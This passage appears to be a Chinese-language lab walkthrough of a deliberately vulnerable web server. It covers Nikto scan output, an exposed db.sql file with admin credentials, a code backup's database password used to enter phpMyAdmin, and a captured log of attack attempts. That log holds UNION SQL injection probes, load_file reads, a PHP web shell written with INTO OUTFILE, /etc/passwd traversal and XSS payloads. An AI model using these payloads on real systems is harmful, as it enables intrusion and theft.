content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies+ Apache/2.2.3 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive informia certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive informia certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive informia certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /css/: Directory indexing found.+ /css/: This might be interesting.+ /files/: Directory indexing found.+ /files/: This might be interesting.+ /lib/: Directory indexing found.+ /lib/: This might be interesting.+ /mail/: Cookie roundcube_sessid created without the httponly flag. See: https://deveozilla.org/en-US/docs/Web/HTTP/Cookies+ /mail/: This might be interesting.+ /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should beted or limited to authorized hosts.+ /phpmyadmin/ChangeLog: Server may leak inodes via ETags, header found with file /php/ChangeLog, inode: 97164, size: 35791, mtime: Thu Oct 20 05:47:44 2095. See: http://cv.org/cgi-bin/cvename.cgi?name=CVE-2003-1418+ /phpmyadmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be proor limited to authorized hosts.+ /sql/: Directory indexing found.+ /manual/: Web server manual found.+ /icons/: Directory indexing found.+ /manual/images/: Directory indexing found.+ /docs/: Directory indexing found.+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restraccess-to-iconsreadme/+ /phpmyadmin/: phpMyAdmin directory found.+ /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and shourotected or limited to authorized hosts.+ /phpmyadmin/README: phpMyAdmin is for managing MySQL databases, and should be proteclimited to authorized hosts. See: https://typo3.org/+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.+ 9060 requests: 0 error(s) and 32 item(s) reported on remote host+ End Time:           2023-04-28 11:16:34 (GMT8) (25 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\nmanual web discoverd看下来没有什么能get shell的漏洞。目前最值得看的是应该是他扫出来的这些网站目录，我们看看都有哪些内容。\n/* http://192.168.56.140/sql/db.sql */CREATE database IF NOT EXISTS cms;use mysql;GRANT ALL PRIVILEGES ON cms.* to &#x27;sql_account&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;sql_password&#x27;;use cms;DROP TABLE IF EXISTS user;DROP TABLE IF EXISTS event;DROP TABLE IF EXISTS log;CREATE TABLE IF NOT EXISTS user (\tuser_id int not null auto_increment primary key,\tuser_username varchar(50) not null,\tuser_password varchar(32) not null);CREATE TABLE IF NOT EXISTS event (\tevent_id int not null auto_increment primary key,\tevent_title varchar(255) not null,\tevent_body text,\tevent_file varchar(255) default null,\tuser_id int not null,\tevent_hits int default 0);CREATE TABLE IF NOT EXISTS log (\tlog_id int not null auto_increment primary key,\tlog_ip varchar(20),\tlog_referer varchar(255),\tlog_useragent varchar(255));DELETE FROM user;DELETE FROM event;DELETE FROM log;INSERT INTO user SET user_id = 1, user_username=&#x27;admin&#x27;, user_password=md5(&#x27;adminpass&#x27;);INSERT INTO event SET event_title=&#x27;Mauris Vel&#x27;, event_body=&#x27;&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer pharetra nulla a velit euismod aliquam. Suspendisse potenti. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Duis eu felis a velit sollicitudin ullamcorper quis et sapien. Proin lacinia, mauris euismod pulvinar iaculis, elit dolor interdum ipsum, eu iaculis leo nisi sit amet enim. Phasellus nunc augue, commodo sed eleifend in, ullamcorper a sapien. Phasellus non posuere massa. Morbi sed posuere urna. Donec tincidunt congue ipsum nec vehicula. Nullam quis nulla erat. Phasellus semper pretium magna at faucibus. Pellentesque sed enim nec dui posuere blandit.&lt;/p&gt;&lt;p&gt;Maecenas malesuada blandit mauris vel tincidunt. Praesent vitae nibh erat. Donec tincidunt blandit aliquam. Donec pulvinar suscipit viverra. Fusce vitae diam non orci adipiscing dapibus nec in tortor. Donec laoreet feugiat adipiscing. Fusce at augue dignissim mauris tincidunt tincidunt. Sed at odio ut nisi vehicula porttitor. Quisque elementum ligula et libero hendrerit lacinia ac vel eros. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Suspendisse ut magna sem, eget pellentesque turpis. Nam ut velit ac lorem fringilla dapibus sit amet vitae leo. Mauris non velit eu neque auctor dignissim. Nam quis ipsum ac lectus commodo adipiscing interdum placerat mi.&lt;/p&gt;&#x27;,user_id = (SELECT user_id from user where user_username = &#x27;admin&#x27;);INSERT INTO event SET event_title=&#x27;Proin velit lacus&#x27;, event_body=&#x27;&lt;p&gt;Proin velit lacus, eleifend id ullamcorper sit amet, mattis id velit. Suspendisse placerat, mi luctus feugiat lacinia, elit odio facilisis dolor, at pellentesque turpis felis tincidunt leo. Quisque quis leo dolor. Donec id nunc ut tortor posuere dictum. Aliquam lobortis auctor neque, sit amet ornare urna ultrices eu. Nunc gravida, lacus id condimentum commodo, lectus enim ultricies tellus, sit amet tempor urna augue a sem. Vestibulum pretium congue nibh ut imperdiet. Fusce ac nibh vel felis vestibulum porttitor. Praesent mattis velit a ipsum aliquam vel commodo libero porttitor. Morbi volutpat, justo nec lobortis accumsan, urna ligula malesuada tellus, pharetra vehicula massa magna ut nulla. Fusce luctus tempor pharetra. In hac habitasse platea dictumst. Etiam in neque pretium mi molestie fringilla. Etiam aliquam accumsan lorem vitae varius. &lt;/p&gt;&#x27;,user_id = (SELECT user_id from user where user_username = &#x27;admin&#x27;);INSERT INTO event SET event_title=&#x27;Praesent magna est&#x27;, event_body=&#x27;&lt;p&gt;Praesent magna est, semper vitae euismod vitae, scelerisque eu nunc. Proin sed nibh a nisl tempus fringilla vitae ac nunc. Maecenas diam ipsum, ultrices vel faucibus non, suscipit nec felis. Praesent eleifend turpis vel orci sollicitudin quis tincidunt ante dapibus. Mauris laoreet mi vel nunc lacinia nec pulvinar lectus congue. Praesent imperdiet sollicitudin urna, sit amet auctor magna eleifend vel. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vivamus elementum, magna vel venenatis pellentesque, nibh orci sollicitudin sapien, in tempor sem orci non metus. Nulla interdum feugiat ultrices. Nam egestas nulla quis dolor aliquam a iaculis arcu lobortis. Vestibulum urna leo, condimentum varius porttitor sed, tincidunt id est. Suspendisse potenti. Nulla fringilla massa ac arcu tempor molestie. Vivamus vehicula aliquet enim, eu porttitor libero suscipit non. &lt;/p&gt;&#x27;,user_id = (SELECT user_id from user where user_username = &#x27;admin&#x27;);INSERT INTO event SET event_title=&#x27;Suspendisse sapien orci&#x27;, event_body=&#x27;&lt;p&gt;Suspendisse sapien orci, luctus laoreet fringilla vitae, sodales non quam. Aliquam vel justo vel enim dapibus ullamcorper. Sed elementum lacus sed tortor imperdiet imperdiet. Maecenas a turpis vel tellus iaculis ullamcorper. Pellentesque vitae orci at dolor vestibulum pharetra sit amet ut sem. Donec nec rhoncus ligula. Suspendisse eget luctus nunc. Nam eget arcu augue, vitae condimentum magna. Etiam et fermentum erat. Fusce vehicula urna ac nisl imperdiet fringilla blandit ut quam. Nullam ultricies eros sit amet sem volutpat eget elementum augue consequat. Integer non arcu orci, in iaculis elit. Fusce eros massa, accumsan in blandit eget, suscipit sit amet nibh. Vestibulum a neque libero. Vivamus purus augue, sollicitudin eget sagittis sed, lacinia sit amet nibh. Nulla eget suscipit libero. &lt;/p&gt;&#x27;,user_id = (SELECT user_id from user where user_username = &#x27;admin&#x27;);\n/sql目录下有个db.sql文件，看上去像是创建网站数据时的操作，仔细看一下发现里面甚至有用户的登陆凭证：admin:adminpass。观察一下数据库构建语句很明显是网站主页登录框的登录凭证。我们尝试登录，发现能成功登录，但是不知道为啥提示登陆成功后并不能正常跳转到管理后台，只会跳回主页。。。。那这个凭证尝试登录目录发现发现的邮箱登录，phpmyadmin登录，都失败，看来没有密码复用，先找找别的路吧。\n我们在/docs目录下发现了code_backup.tgz压缩文件，很有可能是网站的代码备份。我们下载下来看看。OK，果然是，舒服。我们进入conf目录，发现config.ini文件\n;; This is the configuration file;database_host\t=\tlocalhostdatabase_pass\t=\t45kkald?8laLKDdatabase_user\t=\tcms_userdatabase_db\t=\tcms\n明显是连接数据库用的登录凭证 。我们尝试用其登录phpmyadmin，果然成功。我们看看这个账号对数据库的管理权限，发现除了grant权限，其他全有，基本约等于root了，那就方便我们接下来的操作了。但是先别急，我们刚才网站的各个目录还没看完，并且之前手动尝试访问/logs目录时提示要密码，那我们就看看里面有什么东西。我们移动到/logs目录下，发现log.log日志文件。\n2009-06-23 16:06:42\t172.16.18.1 called 2009-06-23 16:06:44\t172.16.18.1 called action=logs2009-06-23 16:06:50\t172.16.18.1 called 2009-06-23 16:06:52\t172.16.18.1 called action=logs2009-06-23 16:06:33\t172.16.18.1 called 2009-06-23 16:06:35\t172.16.18.1 called id=42009-06-23 16:06:37\t172.16.18.1 called action=users2009-06-23 16:06:38\t172.16.18.1 called action=logs2009-06-23 20:06:18\t172.16.18.1 called 2009-06-23 20:06:46\t172.16.18.1 called action=login2009-06-23 20:06:50\t172.16.18.1 called action=login2009-06-23 20:06:45\t172.16.18.1 called 2009-06-23 20:06:17\t172.16.18.1 called 2009-06-23 20:06:26\t172.16.18.1 called 2009-06-23 20:06:50\t172.16.18.1 called 2009-06-23 20:06:57\t172.16.18.1 called 2009-06-23 20:06:51\t172.16.18.1 called 2009-06-23 20:06:38\t172.16.18.1 called 2009-06-23 20:06:51\t172.16.18.1 called 2009-06-23 20:06:55\t172.16.18.1 called 2009-06-23 20:06:29\t172.16.18.1 called 2009-06-23 20:06:32\t172.16.18.1 called id=42009-06-23 20:06:34\t172.16.18.1 called 2009-06-24 17:06:36\t172.16.61.1 called 2009-06-24 17:06:45\t172.16.61.1 called 2009-06-24 17:06:17\t172.16.61.1 called 2009-06-24 17:06:31\t172.16.61.1 called 2009-06-24 17:06:37\t172.16.61.1 called 2009-06-24 17:06:16\t172.16.61.1 called 2009-06-24 17:06:36\t172.16.61.1 called 2009-06-24 17:06:49\t172.16.61.1 called 2009-06-24 17:06:35\t172.16.61.1 called 2009-06-28 13:06:09\t172.16.61.132 called id=4%20UNION%20select%201,1,1,1,1,1%20from%20dual2009-06-28 13:06:09\tProblem with event select: . The used SELECT statements have a different number of columns2009-06-28 13:06:28\t172.16.61.132 called id=4%20UNION%20select%201,1,1,1,1,1,1%20from%20dual2009-06-28 13:06:29\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,1,1,1,1,1,1 from dual&#x27; at line 12009-06-28 13:06:29\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,1,1,1,1,1,1 from dual&#x27; at line 12009-06-28 13:06:43\t172.16.61.132 called id=4%20UNION%20select%20version,1,1,1,1,1,1%20from%20dual2009-06-28 13:06:43\tProblem with event select: . Unknown column &#x27;version&#x27; in &#x27;field list&#x27;2009-06-28 13:06:52\t172.16.61.132 called id=4%20UNION%20select%20version(),1,1,1,1,1,1%20from%20dual2009-06-28 13:06:52\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select version(),1,1,1,1,1,1 from dual&#x27; at line 12009-06-28 13:06:52\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select version(),1,1,1,1,1,1 from dual&#x27; at line 12009-06-28 13:06:13\t172.16.61.132 called id=4%20UNION%20select%201,2,3,4,5,6,7%20from%20dual2009-06-28 13:06:13\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,3,4,5,6,7 from dual&#x27; at line 12009-06-28 13:06:13\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,3,4,5,6,7 from dual&#x27; at line 12009-06-28 13:06:30\t172.16.61.132 called id=4%20UNION%20select%201,2,3,4,5,6,version()%20from%20dual2009-06-28 13:06:30\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,3,4,5,6,version() from dual&#x27; at line 12009-06-28 13:06:30\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,3,4,5,6,version() from dual&#x27; at line 12009-06-28 13:06:54\t172.16.61.132 called id=4%20UNION%20select%201,host,user,4,5,6,version()%20from%20dual2009-06-28 13:06:54\tProblem with event select: . Unknown column &#x27;host&#x27; in &#x27;field list&#x27;2009-06-28 13:06:58\t172.16.61.132 called id=4%20UNION%20select%201,host(),user(),4,5,6,version()%20from%20dual2009-06-28 13:06:58\tProblem with event select: . FUNCTION cms.host does not exist2009-06-28 13:06:02\t172.16.61.132 called id=4%20UNION%20select%201,2,user(),4,5,6,version()%20from%20dual2009-06-28 13:06:02\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,user(),4,5,6,version() from dual&#x27; at line 12009-06-28 13:06:02\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,user(),4,5,6,version() from dual&#x27; at line 12009-06-28 13:06:35\t172.16.61.132 called id=4%20UNION%20select%201,host(),user(),4,5,6,version()%20from%20dual2009-06-28 13:06:35\tProblem with event select: . FUNCTION cms.host does not exist2009-06-28 13:06:41\t172.16.61.132 called id=4%20UNION%20select%201,database(),user(),4,5,6,version()%20from%20dual2009-06-28 13:06:41\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,database(),user(),4,5,6,version() from dual&#x27; at line 12009-06-28 13:06:41\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,database(),user(),4,5,6,version() from dual&#x27; at line 12009-06-28 13:06:23\t172.16.61.132 called id=4%20UNION%20select%201,schema(),system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:23\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,schema(),system_user(),4,5,6,version() from dual&#x27; at line 12009-06-28 13:06:23\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,schema(),system_user(),4,5,6,version() from dual&#x27; at line 12009-06-28 13:06:53\t172.16.61.132 called id=4%20UNION%20select%201,\\!%20ls%20/var/www/html,system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:53\tProblem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;\\! ls /var/www/html,system_user(),4,5,6,version() from dual&#x27; at line 52009-06-28 13:06:44\t172.16.61.132 called id=4%20UNION%20select%201,system(%27ls%20/var/www/html%27),system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:44\tProblem with event select: . FUNCTION cms.system does not exist2009-06-28 13:06:13\t172.16.61.132 called id=4%20UNION%20select%201,system%20%27ls%20/var/www/html%27,system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:13\tProblem with event select: . Unknown column &#x27;system&#x27; in &#x27;field list&#x27;2009-06-28 13:06:18\t172.16.61.132 called id=4%20UNION%20select%201,system%20ls%20/var/www/html,system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:18\tProblem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;/var/www/html,system_user(),4,5,6,version() from dual&#x27; at line 52009-06-28 13:06:48\t172.16.61.132 called id=4%20UNION%20select%201,system%20%27ls%20/var/www/html%27,system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:48\tProblem with event select: . Unknown column &#x27;system&#x27; in &#x27;field list&#x27;2009-06-28 13:06:39\t172.16.61.132 called id=4%20UNION%20select%201,concat(2,%20system%20%27ls%20/var/www/html%27),system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:39\tProblem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;ls /var/www/html&#x27;),system_user(),4,5,6,version() from dual&#x27; at line 52009-06-28 13:06:24\t172.16.61.132 called id=4%20UNION%20select%201,cload_file(%27/var/www/html%27),system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:24\tProblem with event select: . FUNCTION cms.cload_file does not exist2009-06-28 13:06:31\t172.16.61.132 called id=4%20UNION%20select%201,cload_file(%27/var/www/html/index.php%27),system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:31\tProblem with event select: . FUNCTION cms.cload_file does not exist2009-06-28 13:06:26\t172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/index.php%27),system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:26\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/index.php&#x27;),system_user(),4,5,6,version(&#x27; at line 12009-06-28 13:06:26\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/index.php&#x27;),system_user(),4,5,6,version(&#x27; at line 12009-06-28 14:06:08\t172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/index.php%27),system_user(),4,5,6,version()%20from%20dual2009-06-28 14:06:08\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/index.php&#x27;),system_user(),4,5,6,version(&#x27; at line 12009-06-28 14:06:08\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/index.php&#x27;),system_user(),4,5,6,version(&#x27; at line 12009-06-28 14:06:57\t172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/actions/loginphp%27),system_user(),4,5,6,version()%20from%20dual2009-06-28 14:06:57\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/loginphp&#x27;),system_user(),4,5,6,v&#x27; at line 12009-06-28 14:06:57\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/loginphp&#x27;),system_user(),4,5,6,v&#x27; at line 12009-06-28 14:06:09\t172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/actions/login.php%27),system_user(),4,5,6,version()%20from%20dual2009-06-28 14:06:09\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/login.php&#x27;),system_user(),4,5,6,&#x27; at line 12009-06-28 14:06:09\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/login.php&#x27;),system_user(),4,5,6,&#x27; at line 12009-06-28 14:06:22\t172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_GET[%27cmd%27]);?%3E,system_user(),4,5,6,version()%20into%20outfile(%27/tmp/x.php%27)2009-06-28 14:06:22\tProblem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;]);?&gt;,system_user(),4,5,6,version() into outfile(&#x27;/tmp/x.php&#x27;)&#x27; at line 52009-06-28 14:06:07\t172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_GET[\\%27cmd\\%27]);?%3E,system_user(),4,5,6,version()%20into%20outfile(%27/tmp/x.php%27)2009-06-28 14:06:07\tProblem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;)&#x27; at line 52009-06-28 14:06:20\t172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_GET[\\%27cmd\\%27]);?%3E%27,3,4,5,6,7%20into%20outfile(%27/tmp/x.php%27)2009-06-28 14:06:20\tProblem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;(&#x27;/tmp/x.php&#x27;)&#x27; at line 52009-06-28 14:06:00\t172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_GET[\\%27cmd\\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/x.php%272009-06-28 14:06:19\t172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_POST[\\%27cmd\\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/x.php%272009-06-28 14:06:19\tProblem with event select: . File &#x27;/tmp/x.php&#x27; already exists2009-06-28 14:06:29\t172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_POST[\\%27cmd\\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/x.php%272009-06-28 14:06:29\tProblem with event select: . File &#x27;/tmp/x.php&#x27; already exists2009-06-28 14:06:41\t172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_POST[\\%27cmd\\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/y.php%272009-06-28 14:06:02\t172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_POST[\\%27cmd\\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/x.php%272009-06-28 14:06:02\tProblem with event select: . File &#x27;/tmp/x.php&#x27; already exists2009-06-28 15:06:02\t172.16.61.132 called 2009-06-28 15:06:12\t172.16.61.132 called id=42009-06-28 15:06:27\t172.16.61.132 called id=4%272009-06-28 15:06:27\tProblem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27; at line 52009-06-28 15:06:03\t172.16.61.132 called id=4%20UNION%20select%201%20from%20dual2009-06-28 15:06:03\tProblem with event select: . The used SELECT statements have a different number of columns2009-06-28 15:06:57\t172.16.61.132 called id=4%20UNION%20select%201,2,3,4,5,6,7%20from%20dual2009-06-28 15:06:57\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,3,4,5,6,7 from dual&#x27; at line 12009-06-28 15:06:57\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,3,4,5,6,7 from dual&#x27; at line 12009-06-28 15:06:03\t172.16.61.132 called id=4%20UNION%20select%201,database(),user(),4,5,6,version()%20from%20dual2009-06-28 15:06:03\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,database(),user(),4,5,6,version() from dual&#x27; at line 12009-06-28 15:06:03\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,database(),user(),4,5,6,version() from dual&#x27; at line 12009-06-28 15:06:12\t172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/index.php%27),3,4,5,6,7%20from%20dual2009-06-28 15:06:12\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/index.php&#x27;),3,4,5,6,7 from dual&#x27; at line 12009-06-28 15:06:12\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/index.php&#x27;),3,4,5,6,7 from dual&#x27; at line 12009-06-28 16:06:22\t172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/actions/login.php%27),3,4,5,6,7%20from%20dual2009-06-28 16:06:22\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/login.php&#x27;),3,4,5,6,7 from dual&#x27; at line 12009-06-28 16:06:22\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/login.php&#x27;),3,4,5,6,7 from dual&#x27; at line 12009-06-28 16:06:18\t172.16.61.132 called actions/login.php?action=../conf/config.ini%002009-06-28 18:06:13\t172.16.61.132 called actions/login.php?action=../conf/config.ini%002009-06-28 18:06:15\t172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/actions/login.php%27),3,4,5,6,7%20from%20dual2009-06-28 18:06:15\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/login.php&#x27;),3,4,5,6,7 from dual&#x27; at line 12009-06-28 18:06:15\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/login.php&#x27;),3,4,5,6,7 from dual&#x27; at line 12009-06-28 18:06:23\t172.16.61.132 called id=4%20UNION%20select%20NULL,NULL,NULL,NULL,NULL,NULL,%27%3C?php%20echo%20system($_POST[\\%27cmd\\%27]);?%3E%27%20INTO%20OUTFILE(%27/tmp/008st7845.php%27)2009-06-28 18:06:23\tProblem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;(&#x27;/tmp/008st7845.php&#x27;)&#x27; at line 52009-06-28 18:06:06\t172.16.61.132 called id=4%20UNION%20select%20NULL,NULL,NULL,NULL,NULL,NULL,%27%3C?php%20echo%20system($_POST[\\%27cmd\\%27]);?%3E%27%20INTO%20OUTFILE%20%27/tmp/008st7845.php%272009-06-29 16:06:51\t172.16.61.132 called 2009-06-29 16:06:51\t172.16.61.132 called 2009-06-29 16:06:51\t172.16.61.132 called 2009-06-29 16:06:51\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called mod=node&amp;nid=some_thing&amp;op=view2009-06-29 16:06:52\t172.16.61.132 called mod=some_thing&amp;op=browse2009-06-29 16:06:52\t172.16.61.132 called file=index.php2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called Open2009-06-29 16:06:52\t172.16.61.132 called OpenServer2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:53\t172.16.61.132 called 2009-06-29 16:06:53\t172.16.61.132 called 2009-06-29 16:06:53\t172.16.61.132 called 2009-06-29 16:06:53\t172.16.61.132 called 2009-06-29 16:06:53\t172.16.61.132 called 2009-06-29 16:06:53\t172.16.61.132 called download=/winnt/win.ini2009-06-29 16:06:53\t172.16.61.132 called download=/windows/win.ini2009-06-29 16:06:53\t172.16.61.132 called download=/etc/passwd2009-06-29 16:06:54\t172.16.61.132 called |=../../../../../../../../../etc/passwd2009-06-29 16:06:54\t172.16.61.132 called page=../../../../../../../../../../etc/passwd2009-06-29 16:06:54\t172.16.61.132 called page=../../../../../../../../../../boot.ini2009-06-29 16:06:54\t172.16.61.132 called l=forum/view.php&amp;topic=../../../../../../../../../etc/passwd2009-06-29 16:06:54\t172.16.61.132 called module=My_eGallery2009-06-29 16:06:54\t172.16.61.132 called option=search&amp;searchword=&lt;script&gt;alert(document.cookie);&lt;/script&gt;2009-06-29 16:06:54\t172.16.61.132 called dir=&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;2009-06-29 16:06:55\t172.16.61.132 called top_message=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;2009-06-29 16:06:55\t172.16.61.132 called file=Liens&amp;op=\\&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;);&lt;/script&gt;2009-06-29 16:06:55\t172.16.61.132 called catid=&amp;lt;script&amp;gt;alert(&#x27;Vulnerable&#x27;)&amp;lt;/script&amp;gt;2009-06-29 16:06:55\t172.16.61.132 called action=storenew&amp;username=&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;2009-06-29 